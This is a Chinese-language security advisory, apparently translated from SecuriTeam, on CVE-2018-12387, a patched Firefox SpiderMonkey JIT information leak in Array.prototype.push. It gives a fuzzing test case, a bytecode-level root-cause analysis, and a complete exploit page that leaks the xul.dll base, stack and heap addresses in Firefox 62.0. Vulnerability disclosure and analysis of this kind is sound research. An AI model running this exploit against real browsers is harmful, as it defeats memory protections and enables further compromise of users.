@@ -1,0 +1,450 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+![1.png](https://image.3001.net/images/20181029/1540748820_5bd5f6149b7be.png!small)
+
+## 前言
+
+ **研究发现，JavaScript
+JIT编辑器中的Array.prototype.push有多个存在安全问题的参数，而这些参数共同导致了这个信息泄漏漏洞的出现。这个漏洞会将内存地址泄露给一个相关调用函数，攻击者将能够使用这个地址来进一步实施攻击。**
+
+## 厂商回复
+
+这个安全漏洞已经在Firefox 62.0.3和Firefox ESR 60.2.2版本中得到了修复。
+
+## 漏洞CVE编号
+
+CVE-2018-12387
+
+## 漏洞发现者
+
+BrunoKeith和NiklasBaumstark，独立安全研究员，在发现该漏洞之后他们便将漏洞信息上报给了Beyond
+Security的SecuriTeam安全披露项目。
+
+### 受影响的系统
+
+> Firefox 62.0
+>
+> Firefox ESR 60.2
+
+## 漏洞详情
+
+在对Spidermonkey（Mozilla的JavaScript引擎，采用C++编写）进行模糊测试的过程中，我们用下面这段代码成功触发了一次调试断言（Debug
+Assertion）：
+
+    
+    
+    functionf(o) {
+    
+           var a = [o];
+    
+           a.length = a[0];
+    
+           var useless = function () {}
+    
+           var sz = Array.prototype.push.call(a, 42,43);
+    
+           (function () {
+    
+                  sz;
+    
+           })(new Boolean(false));
+    
+    }
+    
+    for(var i = 0; i < 25000; i++) {
+    
+           f(1);
+    
+    }
+    
+    f(2);
+
+上述代码触发了如下所示的断言（Assertion）：
+
+    
+    
+    Assertion failure: isObject() and crashes in release
+    
+    Build
+
+## 根本原因分析
+
+在运行JIT编译器生成的代码时，函数f生成了上述断言。
+
+接下来，我们一起看一看JIT代码中的IR（中间表示）：
+
+![根本原因分析](https://image.3001.net/images/20181029/1540748873_5bd5f64979ec9.png!small)
+
+我们可以看到上图中的arraypusht指令，关于该指令的内容可参考【[这篇文档](https://dxr.mozilla.org/mozilla-central/source/js/src/jit/MCallOptimize.cpp#812)】。函数中的注释信息表示，调用push命令的参数将会被分成多个单独的arraypush{t,v}指令。此时会触发断言，因为在调用函数时，栈指针没有被正确恢复。
+
+在了解了错误发生的场景之后，我们需要从BaselineCompiler.cpp中寻找到负责执行syncStack(0)的操作码Handler，并通过peek()来获取栈地址值：
+
+    
+    
+    //Load lhs in R0, rhs in R1.
+    
+     frame.syncStack(0);
+    
+     masm.loadValue(frame.addressOfStackValue(frame.peek(-2)),R0);
+    
+     masm.loadValue(frame.addressOfStackValue(frame.peek(-1)),R1);
+    
+     // Call IC.
+    
+     ICSetProp_Fallback::Compiler compiler(cx);
+    
+     if(!emitOpIC(compiler.getStub(&stubSpace_)))
+    
+         return false;
+    
+     // Leave the object on the stack.
+    
+     frame.pop();
+
+这个操作码会被下列JavaScript代码执行：
+
+    
+    
+    functionf() {
+    
+           var y = {};
+    
+           var o = {
+    
+                  a: y
+    
+           };
+    
+    }
+    
+    dis(f);
+    
+     /* bytecode:
+    
+     00000: newobject ({}) # OBJ
+    
+     00005: setlocal 0 # OBJ
+    
+     00009: pop #
+    
+     00010: newobject ({a:(void 0)}) # OBJ
+    
+     00015: getlocal 0 # OBJ y
+    
+     00019: initprop "a" # OBJ
+    
+     00024: setlocal 1 # OBJ
+    
+     00028: pop #
+    
+     00029: retrval #
+    
+     */
+
+Handler告诉了我们这个操作码是如何被编译的：R0被设置为了stack[top-1] = o，R1被设置为了stack[top] =
+y，接下来内部缓存会设置R0.a = R1。由于栈地址偏移，在下面的代码中会执行stack[top].a =
+stack[top+1]，因此我们可以在栈外获取一个JSValue：
+
+    
+    
+    vartest = {
+    
+           a: 13.37
+    
+    };
+    
+     
+    
+    functionf(o) {
+    
+           var a = [o];
+    
+           a.length = a[0];
+    
+           var useless = function () {}
+    
+           useless + useless;
+    
+           var sz = Array.prototype.push.call(a,1337, 43);
+    
+           (function () {
+    
+                  sz
+    
+           })();
+    
+           var o = {
+    
+                  a: test
+    
+           };
+    
+    }
+    
+    dis(f);
+    
+    for(var i = 0; i < 25000; i++) {
+    
+           f(1);
+    
+    }
+    
+    f(100);
+    
+    print(test.a);
+    
+    
+    /*bytecode:
+    
+    ...
+    
+    00034:lambda function() {} # FUN
+    
+    00039:setlocal 1 # FUN
+    
+    00043:pop #
+    
+    00044:getlocal 1 # useless
+    
+    00048:getlocal 1 # useless useless
+    
+    00052:add # (useless + useless)
+    
+    00053:pop #
+    
+    00054:getgname "Array" # Array
+    
+    00059:getprop "prototype" # Array.prototype
+    
+    00064:getprop "push" # Array.prototype.push
+    
+    00069:dup # Array.prototype.push Array.prototype.push
+    
+    00070:callprop "call" # Array.prototype.push Array.prototype.push.call
+    
+    00075:swap # Array.prototype.push.call Array.prototype.push
+    
+    00076:getlocal 0 # Array.prototype.push.call Array.prototype.push a
+    
+    00080:uint16 1337 # Array.prototype.push.call Array.prototype.push a 1337
+    
+    00083:int8 43 # Array.prototype.push.call Array.prototype.push a 1337 43
+    
+    00085:funcall 3 # Array.prototype.push.call(...)
+    
+    ...
+    
+    00104:newobject ({a:(void 0)}) # OBJ
+    
+    00109:getgname "test" # OBJ test
+    
+    00114:initprop "a" # OBJ
+    
+    00119:setarg 0 # OBJ
+    
+    00122:pop #
+    
+    00123:retrval #
+
+指令48只会将一个函数push进堆内存中，这样一来指令85（funcall）将不会抛出异常，因为它会尝试从栈中获取Array.prototype.push.call，但是有8字节的偏移量。并在我们的系统上打印出了2.11951350117067e-310，它是整型值0x27044d565235的double类型表示，而这是一个返回地址。最终的漏洞利用代码将能够利用这个缺陷来泄漏堆地址、栈地址和xul.dll的基地址。
+
+## 漏洞利用代码
+
+    
+    
+    <script>
+    
+     
+    
+    varconvert = new ArrayBuffer(0x100);
+    
+    varu32 = new Uint32Array(convert);
+    
+    varf64 = new Float64Array(convert);
+    
+     
+    
+    varBASE = 0x100000000;
+    
+     
+    
+    functioni2f(x) {
+    
+        u32[0] = x % BASE;
+    
+        u32[1] = (x - (x % BASE)) / BASE; ///
+    
+        return f64[0];
+    
+    }
+    
+     
+    
+    functionf2i(x) {
+    
+        f64[0] = x;
+    
+        return u32[0] + BASE * u32[1];
+    
+    }
+    
+     
+    
+    functionhex(x) {
+    
+        return `0x${x.toString(16)}`
+    
+    }
+    
+     
+    
+    vartest = {a:0x1337};
+    
+     
+    
+    functiongen(m) {
+    
+        var expr = '1+('.repeat(m) + '{a:y}' +')'.repeat(m);
+    
+     
+    
+        var code = `
+    
+        f = function(o) {
+    
+            var y = test;
+    
+            var a = [o];
+    
+            a.length = a[0];
+    
+            var useless = function() { }
+    
+            useless + useless + useless + useless +useless + useless;
+    
+            var sz = Array.prototype.push.call(a,1337, 43);
+    
+            (function() { sz; })();
+    
+            var o = ${expr};
+    
+        }
+    
+        `;
+    
+        eval(code);
+    
+    }
+    
+     
+    
+    VERSION= '62.0';
+    
+     
+    
+    functionexploit() {
+    
+        var xul = 0;
+    
+        var stack = 0;
+    
+        var heap = 0;
+    
+     
+    
+        var leak = [];
+    
+        for (var i = 20; i >= 0; --i) {
+    
+            gen(i);
+    
+            for (var j = 0; j < 10000; j++) {
+    
+                f(1);
+    
+            }
+    
+            f(100);
+    
+     
+    
+            var x = f2i(test.a);
+    
+     
+    
+            leak.push(x);
+    
+        }
+    
+     
+    
+        function xulbase(addr) {
+    
+            if (VERSION == '62.0') {
+    
+                var offsets = [
+    
+                    0x92fe34,
+    
+                    0x3bd4108,
+    
+                ];
+    
+            } else {
+    
+                alert('Unknown version: ' +VERSION);
+    
+                throw null;
+    
+            }
+    
+            var res = 0;
+    
+            offsets.forEach((offset) => {
+    
+                if (offset % 0x1000 == addr %0x1000) {
+    
+                    res = addr - offset;
+    
+                }
+    
+            });
+    
+            return res;
+    
+        }
+    
+     
+    
+        xul = xulbase(leak[1]);
+    
+        stack = leak[0];
+    
+        heap = leak[3];
+    
+     
+    
+        var el = document.createElement('pre');
+    
+        el.innerText = (
+    
+            "XUL.dll base: " + hex(xul) +"\n" +
+    
+            "Stack: " + hex(stack) +"\n" +
+    
+            "Heap: " + hex(heap) +"\n" +
+    
+            "\nFull leak:\n" +leak.map(hex).join("\n"))
+    
+        document.body.appendChild(el);
+    
+    }
+    
+    </script>
+    
+     
+    
+    <buttononclick="exploit()">Go</button>
+
+***参考来源：[securiteam](https://blogs.securiteam.com/index.php/archives/3766)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**
+
